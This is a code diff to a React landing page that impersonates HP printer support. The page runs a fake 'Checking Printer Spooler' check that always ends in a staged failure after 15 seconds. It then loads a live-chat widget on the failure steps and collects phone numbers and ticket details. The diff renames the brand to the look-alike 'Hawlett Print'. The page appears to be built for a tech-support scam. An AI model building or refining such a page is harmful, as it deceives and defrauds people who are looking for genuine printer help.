@@ -1,5 +1,6 @@
-import React, { useState, useCallback } from 'react';
-import { Download, X, ArrowRight, Loader2 } from 'lucide-react';
+import React, { useState, useCallback, useEffect } from 'react';
+import { Download, X, ArrowRight } from 'lucide-react';
+import { RotatingLines } from 'react-loader-spinner';
 import { useForm, ValidationError } from '@formspree/react';
 
 export default function HPLandingPage() {
@@ -11,6 +12,21 @@ export default function HPLandingPage() {
     const [phoneNumber, setPhoneNumber] = useState('');
     const [supportTicket, setSupportTicket] = useState('');
     const [state, handleSubmit] = useForm("xqaylanz"); // Replace with your Formspree form ID
+
+    // Load JivoChat script when on Step 5 or Step 6
+    useEffect(() => {
+        if (modalStep === 5 || modalStep === 6) {
+            // Check if script is already loaded
+            const existingScript = document.getElementById('jivochat-script');
+            if (!existingScript) {
+                const script = document.createElement('script');
+                script.id = 'jivochat-script';
+                script.src = '//code.jivosite.com/widget/anGWZz65D4';
+                script.async = true;
+                document.body.appendChild(script);
+            }
+        }
+    }, [modalStep]);
 
     const openModal = useCallback(() => {
         setShowModal(true);
@@ -41,7 +57,7 @@ export default function HPLandingPage() {
         // After 6 seconds, show fail modal
         setTimeout(() => {
             setModalStep(5); // Go to fail modal
-        }, 30000);
+        }, 15000);
     }, []);
 
     const handleRetry = useCallback(() => {
@@ -49,7 +65,7 @@ export default function HPLandingPage() {
         // After 6 seconds, show fail modal again
         setTimeout(() => {
             setModalStep(5); // Go to fail modal
-        }, 6000);
+        }, 15000);
     }, []);
 
     const handleNeedAssistance = useCallback(() => {
@@ -84,8 +100,8 @@ export default function HPLandingPage() {
                         {/* logo */}
                         <img
                             src="/new-hp-logo.svg"
-                            alt="HP Printer"
-                            className="h-8 w-8 sm:h-10 sm:w-10"
+                            alt="Hawlett Print"
+                            className="w-16 h-12 object-contain"
                             loading="eager"
                         />
 
@@ -441,8 +457,17 @@ export default function HPLandingPage() {
                                             />
                                         </div>
                                         <div className="flex items-center justify-center gap-2 sm:gap-3 px-2">
-                                            {/* Spinner loader */}
-                                            <div className="w-5 h-5 sm:w-6 sm:h-6 border-4 border-gray-300 border-t-sky-500 rounded-full animate-spin"></div>
+                                            {/* ThreeDots Spinner */}
+                                            <RotatingLines
+                                                visible={true}
+                                                height="30"
+                                                width="30"
+                                                color="#C0C0C0"
+                                                radius="9"
+                                                ariaLabel="three-dots-loading"
+                                                wrapperStyle={{}}
+                                                wrapperClass=""
+                                            />
 
                                             <span className="text-sm sm:text-base lg:text-lg text-gray-500">
                                                 Checking Printer Spooler...
